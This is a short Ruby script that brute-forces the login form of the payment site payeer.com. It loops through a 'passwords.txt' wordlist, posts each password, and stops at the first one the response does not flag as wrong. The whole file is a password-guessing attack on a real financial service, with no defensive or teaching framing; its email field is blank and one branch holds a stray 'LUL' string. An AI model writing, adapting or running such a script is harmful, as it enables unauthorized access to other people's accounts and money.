require "net/http"
require "uri"

def is_password_wrong?(password)
  uri = URI.parse "https://payeer.com/ru/auth/?backurl=%2Fru%2Faccount%2F"
  response = (Net::HTTP.post_form uri, :email => "", :password => password).body
  response.include?  value="1"
end

input = File.open("passwords.txt", "r")
while (line = input.gets)
  line.strip!
  print "Trying password: #{line}"
  if is_password_wrong? line
    puts "error"
  else
    "LUL"
    input.close
    exit
  end
end
